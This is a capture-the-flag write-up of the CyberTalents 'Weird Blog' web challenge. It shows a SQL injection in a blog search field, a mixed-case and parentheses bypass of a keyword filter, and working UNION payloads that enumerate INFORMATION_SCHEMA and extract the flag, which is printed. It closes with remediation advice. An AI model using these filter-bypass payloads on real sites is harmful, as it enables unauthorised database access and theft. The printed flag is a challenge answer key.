# Weird Blog - CyberTalents

---

## Challenge Description
**Das Kinda weird Just Do it.**

## Challenge Link
https://cybertalents.com/challenges/web/weird-blog/

---

## 1. Initial Interface

The challenge is accessed via the CyberTalents platform, which displays the challenge title, description, and a link to launch the target web application.

<p align="center">
<img width="691" height="356" alt="image" src="https://github.com/user-attachments/assets/449c33dd-1148-4703-9785-4d05d7b69e13" />
</p>

---

## 2. Challenge Page — Weird Blog Website

Upon navigating to the challenge URL, a blog website titled **"Weird Blog"** is presented. The navigation bar contains **Home**, **Services**, and **Contact** links — but clicking any of them produces no change and reveals no exploitable functionality. The page content remains static with nothing interactive at first glance.

<p align="center">
<img width="937" height="458" alt="image" src="https://github.com/user-attachments/assets/0d4014a8-65f3-47f7-994b-db9ac9aede59" />
</p>

---

## 3. Blog Search Field Discovered

A **blog search field** is found on the page. Searching for a test value `hye` returns a blank content area — the page title and navigation remain intact but no blog results are shown. This suggests the search field queries a backend database and is a potential injection point.

<p align="center">
<img width="953" height="449" alt="image" src="https://github.com/user-attachments/assets/a4722b9a-e376-492a-a171-417b3eba02b5" />
</p>

---

## 4. Intercepting the Search Request via Burp Suite

The search request is intercepted using **Burp Suite Proxy**. The captured request confirms the application sends the search value as a **POST request** with the search term in the request body:

```
POST /search HTTP/1.1
Host: [challenge-url]
Content-Type: application/x-www-form-urlencoded

search=hye
```

<p align="center">
<img width="689" height="333" alt="image" src="https://github.com/user-attachments/assets/2e1c7670-a9a5-4779-8354-7d23ef4360bc" />
</p>

This confirms the search value is sent directly to the server — making it a target for SQL injection testing.

---

## 5. Confirming SQL Injection — "Hack Detected" Response

A basic SQL injection payload is submitted in the search field:

```sql
' OR '1'='1'
```

The server responds with:

> **"Hack Detected"**

<p align="center">
<img width="672" height="101" alt="image" src="https://github.com/user-attachments/assets/95e455a7-70bd-4661-ac73-8f98eafa562f" />
</p>

This is actually a **strong confirmation** that the input is being parsed as SQL. The server has a basic filter that detects common SQL keywords — but the fact that it recognises the pattern means the input is reaching the SQL query layer. This tells us:

- The search input is being passed into a SQL query
- There is a **keyword filter** in place — but keyword filters can often be bypassed
- The application is **vulnerable to SQL injection** — we just need to work around the filter

### Bypassing the Keyword Filter — Mixed Case Technique

The server's filter likely checks for exact-case SQL keywords like `UNION`, `SELECT`, `FROM`. A well-known bypass technique is **mixed case** — alternating uppercase and lowercase letters in keywords:

| Blocked | Bypass |
|---------|--------|
| `UNION` | `UnIoN` |
| `SELECT` | `SeLeCt` |
| `FROM` | `FrOm` |
| `WHERE` | `wHeRe` |

SQL is **case-insensitive** by default — so `UnIoN` and `UNION` are treated identically by the database, but the filter only checks for the specific blocked string pattern.

Parentheses are also used instead of spaces — because some filters block spaces. So `SELECT(version())` instead of `SELECT version()`.

<p align="center">
<img width="651" height="355" alt="image" src="https://github.com/user-attachments/assets/34c0cedf-783d-4080-b08d-288c84855868" />
</p>

---

## 6. Fingerprinting the Database — MySQL Version

To identify the database engine, the following payload is injected:

```sql
test'UnIoN(SeLeCt(VerSIOn()))#
```

**How it works — broken down:**

| Part | Meaning |
|------|---------|
| `test'` | Closes the original string in the SQL query |
| `UnIoN` | Combines the original query result with a new query — mixed case to bypass filter |
| `(SeLeCt(VerSIOn()))` | Subquery that returns the database version — parentheses replace spaces |
| `#` | MySQL comment character — comments out the rest of the original query |

<p align="center">
<img width="705" height="315" alt="image" src="https://github.com/user-attachments/assets/6fda724a-3751-4159-9d58-410e92be0dc8" />
</p>

The application returns the database version in the search results:

> **`8.0.21-0ubuntu0.20.04.4`**


This confirms the backend is **MySQL 8.0.21** running on Ubuntu. Knowing the database engine is important because different databases have different system tables and syntax for extracting schema information.

---

## 7. Extracting the Database Schema — Table Name

Now that the database engine is confirmed as MySQL, the **`INFORMATION_SCHEMA`** database is queried to extract table names. This is a special built-in database in MySQL that stores metadata about all databases, tables, and columns.

The payload used:

```sql
t'UnIoN(SeLeCt(TaBLe_NaMe)FrOm(INfOrMaTiON_ScHeMa.tABlEs))#
```

**How it works — broken down:**

| Part | Meaning |
|------|---------|
| `t'` | Closes the original string |
| `UnIoN(SeLeCt(TaBLe_NaMe)` | Selects the `TABLE_NAME` column — contains all table names in the database |
| `FrOm(INfOrMaTiON_ScHeMa.tABlEs)` | From the `INFORMATION_SCHEMA.TABLES` system table — MySQL stores all table names here |
| `#` | Comments out the rest of the original query |

### What is INFORMATION_SCHEMA?

`INFORMATION_SCHEMA` is a special read-only database built into MySQL. It contains metadata about the entire database server — every database, every table, and every column. It is not a real data table but a virtual database that always exists. Key tables inside it include:

| Table | Contains |
|-------|---------|
| `INFORMATION_SCHEMA.TABLES` | Names of all tables in all databases |
| `INFORMATION_SCHEMA.COLUMNS` | Names of all columns in all tables |
| `INFORMATION_SCHEMA.SCHEMATA` | Names of all databases |

By querying `INFORMATION_SCHEMA.TABLES`, the attacker can discover every table in the database without knowing anything about the structure in advance.

The response reveals the table name:

> **Table name: `FL@g`**

<p align="center">
<img width="715" height="379" alt="image" src="https://github.com/user-attachments/assets/4e714732-b8a8-43c3-aee6-ff28f3b850c4" />
</p>


---

## 8. Extracting the Column Name

With the table name `FL@g` discovered, the next step is finding what columns it contains. The `INFORMATION_SCHEMA.COLUMNS` table is queried with a `HAVING` filter to search for columns matching the pattern `FL@g`:

```sql
t'UnIoN(SeLeCt(CoLuMN_NaMe)FrOm(INfOrMaTiON_ScHeMa.cOlUmNs)HavInG(CoLumN_nAmE)lIkE('%25FL@g%25'))#
```

**How it works — broken down:**

| Part | Meaning |
|------|---------|
| `SeLeCt(CoLuMN_NaMe)` | Selects the column name field from the schema |
| `FrOm(INfOrMaTiON_ScHeMa.cOlUmNs)` | From `INFORMATION_SCHEMA.COLUMNS` — stores all column names |
| `HavInG(CoLumN_nAmE)lIkE('%25FL@g%25')` | Filters to only return columns whose name contains `FL@g` |
| `%25` | URL-encoded `%` — the wildcard character in SQL `LIKE` searches |

### Why Use `LIKE` with `%25FL@g%25`?

The `LIKE` operator in SQL allows pattern matching using the `%` wildcard, which means "match anything here." So `%FL@g%` means "find any column name that contains `FL@g` anywhere in it." Since `%` has special meaning in URLs, it must be URL-encoded as `%25` when sent in a web request.

The response reveals the column name:

> **Column name: `FL@g`**

<p align="center">
<img width="692" height="341" alt="image" src="https://github.com/user-attachments/assets/70f3f196-2b0f-4ec5-bd3b-3b540f82fad8" />
</p>


---

## 9. Extracting the Flag

With both the table name (`FL@g`) and column name (`FL@g`) known, the flag is extracted directly:

```sql
t'UnIoN(SeLeCt(`FL@g`)From(`FL@g`))#
```

**How it works — broken down:**

| Part | Meaning |
|------|---------|
| `SeLeCt(\`FL@g\`)` | Selects the `FL@g` column — backticks used because `@` is a special character in MySQL |
| `From(\`FL@g\`)` | From the `FL@g` table — backticks again for the same reason |
| `#` | Comments out the rest of the original query |

### Why Backticks Around `FL@g`?

In MySQL, backticks `` ` `` are used to quote **identifiers** — table names and column names that contain special characters or reserved words. Since `FL@g` contains the `@` symbol (which is not a standard identifier character), it must be wrapped in backticks for MySQL to treat it as a table/column name rather than throwing a syntax error.

The application returns the flag in the search results:

> **FLAG: `{Th3_W31rd3sT_BL0G_3V3r}`**

<p align="center">
<img width="723" height="358" alt="image" src="https://github.com/user-attachments/assets/ae3bb771-5923-41c5-a723-90d034ccdb43" />
</p>

<p align="center">
<img width="427" height="252" alt="image" src="https://github.com/user-attachments/assets/a72c4d8a-80ec-4d9c-89c5-85f8e5745b96" />
</p>

---

# OWASP Classification

This vulnerability falls under:

> **OWASP Top 10: A03 — Injection**

SQL Injection occurs when user-supplied input is incorporated into a database query without proper sanitisation or parameterisation. In this challenge, the blog search field passed input directly into a MySQL query — and while a basic keyword filter was in place, it was trivially bypassed using mixed case and parentheses instead of spaces.

---

# Why This Is a Security Issue

The application attempted to prevent SQL injection using a keyword filter — but keyword filters are one of the weakest defences available:

- **Keyword filters are bypassable** — mixed case, URL encoding, comments, and alternative syntax all work around them
- The input was never **parameterised** — the user's search value was concatenated directly into the SQL string
- **`INFORMATION_SCHEMA`** was accessible — allowing full database enumeration without any prior knowledge
- The flag table and column were directly readable — no privilege escalation required
- The **"Hack Detected" message itself** leaked information — confirming the injection point exists

---

# Exploitation Flow (OWASP A03 Mapping)

1. Attacker accesses the Weird Blog website
2. Home, Services, and Contact pages show nothing exploitable
3. A blog search field is discovered
4. Burp Suite confirms the search is sent as a **POST** body parameter
5. `' OR '1'='1'` is injected — server responds with **"Hack Detected"**
6. Response confirms SQL injection is possible — keyword filter is identified
7. Mixed case + parentheses bypass: `test'UnIoN(SeLeCt(VerSIOn()))#`
8. MySQL version **8.0.21** returned — database engine confirmed
9. `INFORMATION_SCHEMA.TABLES` queried — table name **`FL@g`** discovered
10. `INFORMATION_SCHEMA.COLUMNS` queried with `LIKE` — column name **`FL@g`** discovered
11. Direct `SELECT` on `FL@g` table — flag extracted: **`{Th3_W31rd3sT_BL0G_3V3r}`**

---

# Conclusion

This challenge demonstrates **SQL Injection** against a **MySQL** backend with a weak keyword filter. The filter attempted to block common SQL keywords but was bypassed using **mixed case** (`UnIoN`, `SeLeCt`) and **parentheses instead of spaces**. Once bypassed, `INFORMATION_SCHEMA` provided a complete roadmap of the database — tables, columns, and their contents — without needing any prior knowledge of the schema.

To prevent SQL Injection, applications must:

- **Never use keyword filters** as the primary defence — they are always bypassable
- Use **prepared statements** (parameterised queries) so user input is always treated as data, never as SQL code
- Apply **principle of least privilege** — the database user should not have access to `INFORMATION_SCHEMA`
- **Never expose error messages** or filter detection responses that confirm an injection point exists
